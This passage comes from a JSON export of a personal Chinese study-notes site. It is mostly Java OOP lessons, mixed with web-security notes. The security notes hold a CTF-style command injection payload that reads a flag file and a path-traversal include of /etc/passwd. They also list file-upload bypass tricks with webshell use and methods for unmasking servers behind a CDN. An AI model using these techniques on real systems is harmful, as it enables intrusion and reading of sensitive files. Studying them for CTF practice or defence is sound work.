```\n- 以base64查看flag\n\t- ```\n\t  127.0.0.1|ls|cat${IFS}flag_107231931222903.php|base64\n\t  ```\n- 解码即可","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/04-javaScript%E6%93%8D%E4%BD%9Ccookie":{"title":"04-javaScript操作cookie","content":"\n\npublic:: true\n\n- javascript获取cookie\n  \n  浏览器获取cookie和设置cookie实现登录的工具：**Cookie-Editor**\n  \n  删除就是将其cookie置空即可。\n  \n  ```\n  获取：document.cookie;\n  设置：document.cookie=\"username=wuya\";\n  修改：\n  删除：\n  ```","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/041_%E5%B0%81%E8%A3%85":{"title":"041_封装","content":"# 041_封装\n\n## [[../02基本/022.面向对象和面向过程#^c344fe|封装]]的作用\n\u003e[!作用]\n\u003e保证内部结构的安全性\n\u003e屏蔽复杂，暴露简单\n\n## 怎么进行封装 ^zmfg\n1. **属性**私有化`private`\n2. 创建简单的访问入口:对外提供公开的set和get方法作为**实例方法**,一个属性对外提供两个实例方法（get和set），同时可以对其的set实例方法设立关卡，满足什么条件才set。  ^cjjddfwrk\n\tget方法：\n\t\t```java\n\t\tpublic 返回值类型 get+属性名首字母大写(无参数){\n\t\t\treturn xxx;\n\t\t}\n\t\t```\n\tset方法：\n\t\t```java\n\t\tpublic void set+属性名首字母大写(类型 xxx){\n\t\t\tthis.xxx=xxx;\n\t\t}\n\t\t``` ^e24f40","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/042_%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95":{"title":"042_实例方法","content":"# 042_实例方法\n\n\u003e[!概要]\n\u003e与实例相关的有：实例变量，实例方法\n\u003e实例变量就是**对象变量**，实例方法就是**对象方法**\n\u003e实例相关的都需要先`new`对象，通过**引用**的方式进行访问\n\u003e**实例变量**相当于一个对象，需要我们自己创建一个对象实例来对其进行引用，才能够使用。每次创建一个实例变量，JVM就会为实例变量分配内存\n\u003e也就是实例方法必须通过`实例对象.`去进行调用\n\n语法格式\n相当于普通方法去掉`static`修饰符\n```java\npublic void 方法名(){\n\t方法体\n}\n```\n\n## 举例\n```java\npublic class Shilifangfa {\n\n    public static void main(String[] args) {\n\t\t\n        // 在进行普通方法调用时，通过.方法名进行调用\n        Shilifangfa.daYin1();\n        System.out.println(\"-----------------\");\n\n        // 进行实例方法进行调用的时候，需要先new一个对象给实例方法，再通过 对象. 的方式对其进行调用\n        Shilifangfa dy=new Shilifangfa();\n        dy.daYin2();\n    }  \n\t\n    // 普通方法\n    public static void daYin1() {\n        System.out.println(\"普通方法\");\n    }\n\n    // 实例方法\n    public void daYin2() {\n        System.out.println(\"实例方法\");\n\n    }\n}\n```\n\n输出\n```cmd\n普通方法\n-----------------\n实例方法\n```\n\n\u003e[!关键]\n\u003e实例方法必须要有对象作为支撑，如果没有对象，那么它就相应的不存在\n\u003e实例方法不加static，即动态方法\n\u003e动态方法（实例方法）必须有对象支撑，且通过对象才能使用，而静态方法可以全局使用（前提是public）\n\n## 相关\n![[../05this和static关键字/1static相关/054.实例方法的调用]]","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/043_%E4%B9%A6%E5%86%99%E6%A0%BC%E5%BC%8F":{"title":"043_书写格式","content":"# 043_书写格式\n\n## Java的封装[[041b-封装#^zmfg|格式]]举例\n## 对java对象的属性进行私有化\n```java\npulic class Person{\n\tprivate int age;//private私有化修饰符\n\tprivate String name;\n}\n```\n## [[041b-封装#^e24f40|对外提供get和set公开入口]]\n```java\npulic class Person{\n\tprivate int age;//private私有化修饰符\n\n\t\n\tpublic int getAge(){//获取，需要返回值\n\treturn age;\n\t}\n\tpublic void setAge(int nianLing){//修改，不需要返回值\n\t\tage=nianLing;\n\t}\n}\n```\n以上的get和set方法都没有加`static`修饰符，因为其为**实例方法**，需要依赖于生成的对象，没有对象，就不知道设置谁的属性了，这样才符合规律。没有person对象，设置年龄没用。\n## 进行调用\n```java\n        Person per1 = new Person();    \n\n        per1.setName(\"蔡徐坤\");\n\n        System.out.println(per1.getName());\n```\n输出结果\n```cmd\n蔡徐坤\n```","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/05-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1":{"title":"05-文件上传漏洞的利用与防御","content":"\n- # 利用\n- ## 利用流程\n- 1、找到上传的位置\n  2、尝试绕过校验，上传文件\n  3、获得文件位置\n  4、蚁剑连接，管理文件\n- ## 绕过\n- 总结：删除/禁用JS、修改MIME、等价扩展名、大小写、\n  htaccess、双写、空格、点、::$DATA、%00截断、0x00截\n  断、图片马、条件竞争等等。\n- ## 发现\n- https://github.com/almandin/fuxploider\n-\n- # 防御\n- ## 文件上传漏洞发生的前提\n- 1、网站上传功能能正常使用\n  2、文件类型允许上传\n  3、上传路径可以确定\n  4、文件可以被访问，可以被执行或被包含（linux中可以设置执行权限）\n- ## 具体的防御措施\n- 扩展名（后缀）黑白名单\n  MIME类型校验（image/gif）\n  文件内容头校验（GIF89a）\n  对文件内容进行二次渲染\n  对上传的文件重命名，不易被猜测\n  不要暴露上传文件的位置\n  禁用上传文件的执行权限","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/05-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8":{"title":"05-文件包含漏洞挖掘与利用","content":"\n\n- ## 挖掘\n- 关键字\n\t- URL参数名字出现了page、file、filename、include等等关键\n\t  字。\n\t  URL参数值出现了文件名，比如xxx.php xxx.html 等等。\n\t  比如：\n\t  ?file=content\n\t  ?page=wuya.asp\n\t  ?home=wuya.html\n- ## 利用流程\n- 1、发现漏洞\n  2、上传shell / 读取敏感文件（FUZZ）\n  3、执行恶意代码\n-\n- 敏感文件：比如shell、词典、木马、后门等等\n- 技巧：`http://LinuxIP/include.php?file=../../../../../etc\n  /passwd`多个回车会回到`/`目录","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/05-%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5xss":{"title":"05-脚本注入xss","content":"\n# 基本概念\n\nXSS ： Cross Site Script（跨站脚本攻击）\n\n过程： 恶意攻击者利用web页面的漏洞，插入一些恶意代码， 当用户访问页面的时候，代码就会执行，这个时候就 达到了攻击的目的。\n\n常被攻击书写的语言：[JavaScript](https://wiki.doingnothing.online/#JavaScript)、Java、VBScript、[ActiveX](https://wiki.doingnothing.online/#ActiveX)、Flash\n# 分类\n\n反射型（dom），存储型\n\n区别就是**是否在服务器存储了其对应的xss跨站攻击脚本**\n\n存储型常用的就是在**评论区**，**发帖**等等地方，留下跨站攻击脚本，别人访问到这个来自服务器加载的评论，就会受到xss攻击。","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/05-CDN%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB":{"title":"05-CDN指纹识别","content":"\n\n- CDN云观测：http://cdn.chinaz.com/ [cdnplanet](https://www.cdnplanet.com/) [脚本探测：xcdn](https://github.com/3xp10it/xcdn)\n  title:: CDN指纹识别\n  \n  #question 如何获取CDN背后的真实IP？\n  \n  1、超级ping 2、历史DNS 3、通过子域名查询IP 4、国外主机解析 5、其他\n  \n  #question CDN如何配置？\n  \n  CNAME解析到CDN服务器\n  \n  CDN指纹识别[[软件工具]] ： #常规工具 - ping - nslookup - 超级ping - ldb（load balance detector）\n  \n  专用[[软件工具]] 国内： http://cdn.chinaz.com/ 国外： https://www.cdnplanet.com/tools/cdnfinder/ 脚本： https://github.com/boy-hack/w8fuckcdn/ https://github.com/3xp10it/xcdn","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/0512_%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97":{"title":"051_静态代码块","content":"# 051_静态代码块\n\n## 执行\n1. **类加载时**执行，在**main方法前执行**\n2. 只执行一次\n3. 常常用于记录程序类加载到JVM中的日志\n4. 自上而下执行\n5. 允许多个静态代码块\n6. 是一个特殊时机：**类加载时机**\n\n\n## 语法格式\n```java\nstatic{\n\tjava 语句;\n\tjava 语句;\n}\n```\n\n## eg\n![[../../../../assets/Pasted image 20220702221730.png]]\n由上图可以**即使将静态代码块写在main方法后面，依旧只是在类加载时，main方法执行前加载**\n\n一般只写一个静态代码块，用来记录类加载时机的日志，因为其每次只在类加载时加载一次，所以不会反复加载。（废物文学）\n静态代码块与静态变量是有顺序的。eg忘了","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/0512_static%E5%8F%98%E9%87%8F":{"title":"0512_static变量","content":"# 0512_static变量\n## 不声明static时\n```java\npublic class a02Chinese {\n    public static void main(String[] args) {\n        Chinese c1=new Chinese(\"521\",\"张三\",\"Chinese\");\n        Chinese c2=new Chinese(\"522\",\"李四\",\"Chinese\");\n        //输出\n        System.out.println(c1.idCard);\n        System.out.println(c1.name);\n        System.out.println(c1.country);\n        System.out.println();\n        System.out.println(c2.idCard);\n        System.out.println(c2.name);\n        System.out.println(c2.country);\n    }\n}\nclass Chinese{\n    String idCard;//身份证号\n    String name;\n    String country;//国家\n    //无参数构造方法\n    public Chinese(){\n\n    }\n    //有参数构造方法\n    public Chinese(String idCard, String name, String country) {\n        this.idCard = idCard;\n        this.name = name;\n        this.country = country;\n    }\n\n\n}\n```\n对于Chinese中国人类的国籍属性中，因为中国人类的国籍都是中国，所以在new对象之后，会重复的创建国籍中国属性\n内存图如图\n![[../assets/a725c93dd49f485bbf3bc8c47564207a.png]]\n每次new一个对象，都会在堆内存中新开辟一块地址用于存储country属性，耗内存\n\n输出结果\n```cmd\n521张三\nChinese\n\n522\n李四\nChinese\n```\n\n## 声明static之后\n```java\npublic class a02Chinese {\n    public static void main(String[] args) {\n        Chinese c1=new Chinese(\"521\",\"张三\");\n        Chinese c2=new Chinese(\"522\",\"李四\");\n        //输出\n        System.out.println(c1.idCard);\n        System.out.println(c1.name);\n        //国籍就不能采用实例对象.的方式去进行调用了，而是采用类.方式去调用\n        System.out.println(Chinese.country);\n        System.out.println();\n        System.out.println(c2.idCard);\n        System.out.println(c2.name);\n        System.out.println(Chinese.country);\n    }\n}\nclass Chinese{\n    String idCard;//身份证号\n    String name;\n    static String country=\"Chinese\";//声明静态变量的同时对其进行默认值赋值\n    //无参数构造方法\n    public Chinese(){\n\n    }\n    //有参数构造方法\n    public Chinese(String idCard, String name) {\n        this.idCard = idCard;\n        this.name = name;\n\n    }\n}\n```\nstatic静态变量的同时，对其进行赋值\n内存图\n![[../assets/d28ea86875c64e128bcb4ea43b24e54a.png]]\n输出结果\n```cmd\n521\n张三\nChinese\n\n522\n李四\nChinese\n```\n\n\u003e[!tips]\n\u003e注意声明静态变量的时候，在之后的构造方法中，就不需要将其加入形参\n\u003e进行调用的方式，采用`类.`方式去进行调用，使用 实例对象.的方式去调用也可以 \n\t![[Pasted image 20220702164519.png]]虽然有报错，但是依旧可以这样调用，只是更加建议采用 `类.` 的方式去调用","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/0514_%E5%AE%9E%E4%BE%8B%E4%BB%A3%E7%A0%81%E5%9D%97":{"title":"0514_实例代码块","content":"# 0514_实例代码块\n\n## 语法格式\n```java\n\t{\n\tjava 语句;\n\t}\n```\n## 作用\n\u003e[!作用]\n\u003esun公司为程序员准备的特殊时机：**对象创建时机**；\n\u003e实例代码块，会在构造方法前执行，只要**构造方法创建对象**，就会在**对象创建之前执行实例代码块**；\n\u003e如果每个构造方法中都有相同的部分，可以将相同的部分放在实例代码块中，这样每次执行new对象的时候，都可以通过实例代码块执行内容。\n\n## eg\n```java\npackage a005StaticAndthis;\n\npublic class a05ShiliDaimakuai {\n    public static void main(String[] args) {\n        System.out.println(\"main开始执行：\");\n        a05ShiliDaimakuai c1 = new a05ShiliDaimakuai();//创建对象\n        a05ShiliDaimakuai c2 = new a05ShiliDaimakuai(\"sds\");//创建对象\n\n        \n\n        \n    }\n    //无参数构造方法\n    public a05ShiliDaimakuai() {\n        System.out.println(\"开始使用无参数构造方法\");\n    }\n    //有参数构造方法\n    public a05ShiliDaimakuai(String name){\n        System.out.println(\"开始使用有参数的构造方法\\t\"+name);\n\n    }\n\n}\n\n```\n输出结果\n![[../../../../assets/Pasted image 20220703105401.png]]\n\u003e[! ]\n\u003e由此可见，每次new对象的时候，就会率先执行实例代码块中的内容，通过实例代码块可以直观的看到创建对象时机\n\n\n","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/0515_%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E5%92%8C%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95":{"title":"0515_静态方法和实例方法","content":"# 0515_静态方法和实例方法\n\n```java\npublic class a01Statictest {\n\n    public static void main(String[] args) {\n\n    daYin1();//直接调用\n\n  \n\n    // 实例方法\n\n    a01Statictest dd = new a01Statictest();//创建该类的实例化对象\n\n    dd.daYin2();    //调用\n\n    }\n\n    // 静态方法\n\n    public static void daYin1(){\n\n        System.out.println(\"静态方法可以直接调用\");\n\n    }\n\n  \n\n    // 实例方法\n\n    public void daYin2(){\n\n        System.out.println(\"实例方法需要先创建对象，对 对象.进行调用\");\n\n    }\n\n}\n```\n静态方法和实例方法的 调用方法不同\n静态方法可以直接进行调用，而实例方法需要通过创建对象，对对象.的方法进行调用实例中的方法","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/0516_%E7%A9%BA%E6%8C%87%E9%92%88%E8%AE%BF%E9%97%AE%E9%9D%99%E6%80%81%E4%B8%8D%E4%BC%9A%E7%A9%BA%E6%8C%87%E9%92%88":{"title":"0516_空指针访问静态不会空指针","content":"# 0516_空指针访问静态不会空指针\n\n![[../../../../assets/Pasted image 20220702164751.png]]\n即使将对象置空，引用静态变量，依旧不会出现空指针异常，\n因为静态变量不依赖于对象的建立，而是类级别的，类相关的","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/0517_%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8":{"title":"0517_实例方法的调用","content":"# 0517_实例方法的调用\n\n调用实例方法的原则\n类=属性+方法\n\n实例变量，需要对象\n所以**当方法需要由对象触发，就需要定义为实例方法**\n## 相关\n![[042b-实例方法]]","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/0518_%E4%B8%8D%E5%90%8C%E4%BB%A3%E7%A0%81%E5%9D%97%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F":{"title":"0518_不同代码块执行顺序","content":"# 0518_不同代码块执行顺序\n\n\n代码\n```java\npackage a005StaticAndthis;\n\npublic class A06DaimaShunxu {\n    // 静态代码块\n    static{\n        System.out.println(\"静态代码块A\");\n    }\n    public static void main(String[] args) {\n        System.out.println(\"main主方法\");\n        A06DaimaShunxu d = new A06DaimaShunxu();\n    }\n\n    //构造方法\n    public A06DaimaShunxu(){\n        System.out.println(\"无参构造方法A\");\n    }\n    {\n        System.out.println(\"实例代码块A\");\n    }\n    static{\n        System.out.println(\"静态代码块B\");\n    }\n}\n\n```\n---\n输出结果\n![[../../../../assets/Pasted image 20220703110707.png]]\n---\n由此可见\n1. 当类加载的时候，会最先执行静态代码块，自上而下\n2. 然后执行main主方法中的代码\n3. 如果遇到构造方法的时候，那么就会在构造方法的之前执行实例代码块的内容，然后再构造对象","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/051_static":{"title":"051_static","content":"# 051_static\n\n1. static翻译“静态”\n2. static修饰的都是类相关的，class级别的\n3. static修饰的，都可以直接采用`类名.`进行访问\n4. static修饰的变量：静态变量\n5. static修饰的方法：[[052.静态方法和实例方法|静态方法]]\n\n\u003e[!变量的分类]\n\u003e根据声明的位置分为\n\t\u003e1. 方法体中的变量：局部变量\n\t\u003e2. 方法体外的变量：成员变量\n\t\t\u003e成员变量又分为：\n\t\t\t\u003e实例变量：需要通过[[../../02基本/024.对象的创建|创建对象]]来进行调用\n\t\t\t\u003e静态变量：可以直接使用，**没有空指针异常的情况发生**\n\n","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/0521_this%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84":{"title":"0521_this的内存结构","content":"# 0521_this的内存结构\n\n```java\npackage a005StaticAndthis.This;\n\npublic class B01nc {\n    public static void main(String[] args) {\n        Customer c=new Customer(\"张三\");\n        Customer c2=new Customer(\"李四\");\n\n        c.shopping();\n        c2.shopping();\n    }\n}\nclass Customer{\n    String name;//属性\n\n    //构造方法\n    public Customer(){}\n    // 有参构造方法\n    public Customer(String s){\n        name=s;\n    }\n\n    //顾客购物的方法\n    //实例方法\n    public void shopping(){\n        System.out.println(name+\" 正在购物！\");\n    }\n}\n\n\n```\n内存图如图所示\n![[../assets/1c40478d3a4a411d9aa4aa6146b25e37.png]]\n\n\n\u003ethis保存在堆内存中对象自身内部，并且执行自身的内存地址\n\u003e相当于每个对象都有自己的this属性，这个属性保存的是对象在堆内存中的地址\n\u003e**this代表的是当前对象在内存中的地址，调用那个实例对象，this就是那个实例对象的内存地址**\n\n## 什么时候this不能省略\n当采用实例方法的时候，局部变量与对象的属性名字一样的时候，不能省略this\n如下\n```java\nclass Book{\n    private String title;\n    private int page;\n\n    //提供实例方法进行封装\n      public String getTitle() {\n        return title;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n}\n```\n当局部变量的title与所创建对象的属性名称一样的时候，在进行赋值的时候，必须在前面的实例对象属性前加上`this.`，否则赋值无效\n\u003e[!作用]\n\u003e \"this.\" 相当于 “这个实例对象的”\n\u003e 其作用主要是为了在实例方法或者构造方法中区分实例变量与局部变量","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/0522_this%E6%80%BB%E7%BB%93":{"title":"0522_this总结","content":"# 0522_this总结\n\n## 基本\n1. this用于在实例对象中，表示当前对象\n\n1. **this不能用在静态方法中**，因为静态方法是类级别的，不是对象级别的\n1. 静态方法中不存在当前对象，采用`类.`的方式使用静态方法\n\n## 主要作用\n1. 在实例方法或者构造方法中[区分实例变量与局部变量](056.this的内存结构.md#什么时候this不能省略)\n2.  在构造方法中，可以[通过this在无参数构造方法去调用本类的有参数构造方法](060.this无参调有参构造方法.md)","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0523_this%E4%BE%8B%E5%AD%90":{"title":"0523_this例子","content":"# 0523_this例子\n\n```java\npackage day15作业;\n\npublic class Homework01 {\n    public static void main(String[] args) {\n        Book book1 = new Book(\"高三数学\",126);\n        System.out.println(book1.getTitle());;\n        System.out.println(book1.getPage());\n\n        Book book2 = new Book();\n        book2.setPage(456);\n        book2.setTitle(\"盗墓笔记\");\n        System.out.println(book2.getTitle());\n        System.out.println(book2.getPage());\n\n        System.out.println(\"打印细节\");\n        book1.detail();\n\n    }  \n}\nclass Book{\n    private String title;\n    private int page;\n\n    //提供实例方法进行封装\n      public String getTitle() {\n        return title;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n\n    public int getPage() {\n        return page;\n    }\n\n    public void setPage(int page) {\n        if(page\u003c200){\n            System.out.println(\"本书小于200页,已经设置为200页\");\n            this.page=200;\n            return;\n        }\n        this.page = page;\n    }\n\n    //创建构造方法\n    public Book(){\n        this.page=200;\n\n    }\n    public Book(String title, int page) {\n        this.title = title;\n        if(page\u003c200){\n            System.out.println(\"本书小于200页,已经设置为200页\");\n            this.page=200;\n        }else{\n            this.page = page;\n        }\n\n    }\n    public void detail(){\n        System.out.println(\"教材名称:\"+title+\"\\t教材页数：\"+page);\n    }\n\n    \n\n  \n}\n```\n输出\n![[../../../../assets/Pasted image 20220704153923.png]]","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0524_%E5%8F%98%E9%87%8F%E7%9A%84%E5%88%86%E5%B8%83":{"title":"0524_变量的分布","content":"# 0524_变量的分布\n\n局部变量、实例变量、静态变量在内存中的分配\n![](../assets/0f5dba1392944adb875bf849673cb852.png)","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0525_%E6%96%B9%E6%B3%95%E5%AE%9A%E4%B9%89static":{"title":"0525_方法定义static","content":"# 0525_方法定义static\n\n\n\t```java\n\t\tpublic static void jiecheng(int a) {\n\n        int aa=1;\n\n        for (int i = 1; i \u003c= a; i++) {\n\n            aa*=i;\n\n        }\n\n        System.out.println(a+\"的阶乘是\\t\"+aa);\n\n    }\n```\n\n^d527f7\n\n没有实例化的方法函数，需要在前面的修饰符中加入static，否则就会报错`Cannot make a static reference to the non-static method jiecheng(int) from the type Jiecheng`\n![[../01铺垫/asset/Pasted image 20220628103019.png]]","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0525_this%E6%97%A0%E5%8F%82%E8%B0%83%E6%9C%89%E5%8F%82%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95":{"title":"0525_this无参调有参构造方法","content":"# 0525_this无参调有参构造方法\n\n\n```java\n    public Date(){\n        // year=1982;\n        // month=12;\n        // day=3;\n        //等同于通过this去调用这个对象的有参数构造方法\n        this(1982,12,3);\n    }\n    public Date(int year,int month,int day){\n        this.year=year;\n        this.month=month;\n        this.day=day;\n    }\n```\n通过this()可以直接在无参数构造方法去调用有参数的构造方法，节省代码编写量\n\n\u003e[!注意]\n\u003ethis()只能出现在构造方法的第一行","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0526_this%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84":{"title":"0526_this的内存结构","content":"# 0526_this的内存结构\n\n\n```java\npackage a005StaticAndthis.This;\n\npublic class B01nc {\n    public static void main(String[] args) {\n        Customer c=new Customer(\"张三\");\n        Customer c2=new Customer(\"李四\");\n\n        c.shopping();\n        c2.shopping();\n    }\n}\nclass Customer{\n    String name;//属性\n\n    //构造方法\n    public Customer(){}\n    // 有参构造方法\n    public Customer(String s){\n        name=s;\n    }\n\n    //顾客购物的方法\n    //实例方法\n    public void shopping(){\n        System.out.println(name+\" 正在购物！\");\n    }\n}\n\n\n```\n内存图如图所示\n![[../assets/1c40478d3a4a411d9aa4aa6146b25e37.png]]\n\n\n\u003ethis保存在堆内存中对象自身内部，并且执行自身的内存地址\n\u003e相当于每个对象都有自己的this属性，这个属性保存的是对象在堆内存中的地址\n\u003e**this代表的是当前对象在内存中的地址，调用那个实例对象，this就是那个实例对象的内存地址**\n\n## 什么时候this不能省略\n当采用实例方法的时候，局部变量与对象的属性名字一样的时候，不能省略this\n如下\n```java\nclass Book{\n    private String title;\n    private int page;\n\n    //提供实例方法进行封装\n      public String getTitle() {\n        return title;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n}\n```\n当局部变量的title与所创建对象的属性名称一样的时候，在进行赋值的时候，必须在前面的实例对象属性前加上`this.`，否则赋值无效\n\u003e[!作用]\n\u003e \"this.\" 相当于 “这个实例对象的”\n\u003e 其作用主要是为了在实例方法或者构造方法中区分实例变量与局部变量","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0529_%E5%8F%98%E9%87%8F%E7%9A%84%E5%88%86%E5%B8%83":{"title":"0529_变量的分布","content":"# 0529_变量的分布\n\n\n局部变量、实例变量、静态变量在内存中的分配\n![](../assets/0f5dba1392944adb875bf849673cb852.png)","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/052_%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E5%92%8C%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95":{"title":"052_静态方法和实例方法","content":"# 052_静态方法和实例方法\n\n```java\npublic class a01Statictest {\n\n    public static void main(String[] args) {\n\n    daYin1();//直接调用\n\n  \n\n    // 实例方法\n\n    a01Statictest dd = new a01Statictest();//创建该类的实例化对象\n\n    dd.daYin2();    //调用\n\n    }\n\n    // 静态方法\n\n    public static void daYin1(){\n\n        System.out.println(\"静态方法可以直接调用\");\n\n    }\n\n  \n\n    // 实例方法\n\n    public void daYin2(){\n\n        System.out.println(\"实例方法需要先创建对象，对 对象.进行调用\");\n\n    }\n\n}\n```\n静态方法和实例方法的 调用方法不同\n静态方法可以直接进行调用，而实例方法需要通过创建对象，对对象.的方法进行调用实例中的方法","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/053_%E6%96%B9%E6%B3%95%E5%AE%9A%E4%B9%89static":{"title":"100-方法定义static","content":"# 100-方法定义static\n\t```java\n\t\tpublic static void jiecheng(int a) {\n\n        int aa=1;\n\n        for (int i = 1; i \u003c= a; i++) {\n\n            aa*=i;\n\n        }\n\n        System.out.println(a+\"的阶乘是\\t\"+aa);\n\n    }\n```\n\n^d527f7\n\n没有实例化的方法函数，需要在前面的修饰符中加入static，否则就会报错`Cannot make a static reference to the non-static method jiecheng(int) from the type Jiecheng`\n![[../01铺垫/asset/Pasted image 20220628103019.png]]","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/053_%E7%A9%BA%E6%8C%87%E9%92%88%E8%AE%BF%E9%97%AE%E9%9D%99%E6%80%81%E4%B8%8D%E4%BC%9A%E7%A9%BA%E6%8C%87%E9%92%88":{"title":"053_空指针访问静态不会空指针","content":"# 053_空指针访问静态不会空指针\n\n![[../../../../assets/Pasted image 20220702164751.png]]\n即使将对象置空，引用静态变量，依旧不会出现空指针异常，\n因为静态变量不依赖于对象的建立，而是类级别的，类相关的","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/054%E5%AE%9E%E4%BE%8B%E8%B4%A6%E6%88%B7%E5%8F%96%E9%92%B1":{"title":"实例：账户取钱","content":"# 实例：账户取钱\n```java\npackage day15作业;\n/*\n写一个名为Account的类模拟账户。\n该类的属性和方法如下所示。\n该类包括的属性：账户id，余额balance，年利率annualInterestRate；\n包含的方法：各属性的set和get方法。取款方法withdraw()，存款方法deposit()\n\n写一个测试程序\n（1）创建一个Customer，名字叫Jane Smith，他有一个账号为1000，余额为2000，年利率为1.23%的账户\n（2）对Jane Smith操作：\n存入100元，再取出960元，再取出2000。\n打印Jane Smith的基本信息\n信息如下显示：\n成功存入：100\n成功取出：960\n余额不足，取钱失败\nCustomer [Smith，Jane] has a account ：id is 1000 annualInterestRate is 1.23% balance is 1140.0\n\n*/\npublic class Homework2 {\n    public static void main(String[] args) {\n        // 账号为1000，余额为2000，年利率为1.23%的账户\n        Account janAcc = new Account(\"1000\",2000,0.0123);\n        // 创建一个Customer，名字叫Jane Smith\n        Customer jan = new Customer(\"Jane Smith\",janAcc);\n        System.out.println(\"姓名:\"+jan.getName()+\"；账户id：\"+jan.getAct().getId()+\"；余额：\"+jan.getAct().getBalance());\n\n        // 存钱100\n        jan.getAct().deposit(100);\n        // 取钱960\n        jan.getAct().withdraw(960);\n        //取钱2000\n        jan.getAct().withdraw(2000);\n        \n    }\n}\n\n// 客户类\nclass Customer{\n    private String name;//客户名字\n    private Account act;\n\n\n    // 构造方法\n    public Customer() {\n        this.name=\"未知\";\n        this.act=new Account(\"账户1\",0,0.01);\n    }\n    public Customer(String name, Account act) {\n        this.name = name;\n        this.act = act;\n    }\n    //get and set封装\n    public String getName() {\n        return name;\n    }\n    public void setName(String name) {\n        this.name = name;\n    }\n    public Account getAct() {\n        return act;\n    }\n    public void setAct(Account act) {\n        this.act = act;\n    }\n    \n}\n\n// 账户类\nclass Account{\n    private String id;\n    private double balance;\n    private double annualInterestRate;\n    //get and set\n    public String getId() {\n        return id;\n    }\n    public void setId(String id) {\n        this.id = id;\n    }\n    public double getBalance() {\n        return balance;\n    }\n    public void setBalance(double balance) {\n        this.balance = balance;\n    }\n    public double getAnnualInterestRate() {\n        return annualInterestRate;\n    }\n    public void setAnnualInterestRate(double annualInterestRate) {\n        this.annualInterestRate = annualInterestRate;\n    }\n    //构造方法\n    public Account(){\n        this(\"id号\",0,0.0123);\n    }\n    public Account(String id,double balance,double annualInterestRate){\n        this.id=id;\n        this.balance=balance;\n        this.annualInterestRate=annualInterestRate;\n    }\n    /*\n     * 存款取款\n     */\n    //存款\n    public void deposit(double balance){\n        this.balance+=balance;\n        System.out.println(\"存款： \"+balance+\" 元\\t\"+\"当前余额： \"+this.balance+\"元。\");\n    }\n    // 取款\n    public void withdraw(double balance){\n        if (this.balance\u003cbalance) {\n            System.out.println(\"余额不足，取钱失败！！！\\t\"+\"当前余额： \"+this.balance+\"元。\");\n            return;\n        }\n        this.balance-=balance;\n        System.out.println(\"取款成功!!!\\t\"+\"当前余额： \"+this.balance+\"元。\");\n    }\n\n}\n```\noutput：\n![](../../../../assets/Pasted%20image%2020220704192450.png)","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/054_%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8":{"title":"054_实例方法的调用","content":"# 054_实例方法的调用\n\n调用实例方法的原则\n类=属性+方法\n\n实例变量，需要对象\n所以**当方法需要由对象触发，就需要定义为实例方法**\n## 相关\n![[042b-实例方法]]","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/055_%E4%B8%8D%E5%90%8C%E4%BB%A3%E7%A0%81%E5%9D%97%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F":{"title":"055_不同代码块执行顺序","content":"# 055_不同代码块执行顺序\n\n\n代码\n```java\npackage a005StaticAndthis;\n\npublic class A06DaimaShunxu {\n    // 静态代码块\n    static{\n        System.out.println(\"静态代码块A\");\n    }\n    public static void main(String[] args) {\n        System.out.println(\"main主方法\");\n        